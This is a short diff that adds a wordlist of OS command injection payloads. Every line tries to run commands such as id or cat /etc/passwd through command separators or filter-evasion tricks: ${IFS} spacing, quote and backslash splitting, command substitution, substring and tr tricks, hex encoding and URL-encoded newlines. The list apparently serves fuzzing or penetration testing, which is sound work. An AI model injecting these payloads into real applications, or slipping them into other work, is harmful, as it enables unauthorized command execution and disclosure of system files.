@@ -1,0 +1,22 @@
+cat /etc/passwd
+id; cat /etc/passwd
+id && cat/etc/passwd
+id & cat /etc/passwd
+id || cat /etc/passwd
+id | cat /etc/passwd
+{cat,/etc/passwd}
+cat${IFS}/etc/passwd
+ls${IFS}-la
+;ls%09-al%09/home
+wh``oami
+w"h"o"am"i
+wh""oami
+"wh"oami
+w\ho\am\i
+who$()ami
+who$(echo am)i
+who`echo am`
+cat ${HOME:0:1}etc${HOME:0:1}passwd
+cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+cat%20/et%5C%0Ac/pa%5C%0Asswd
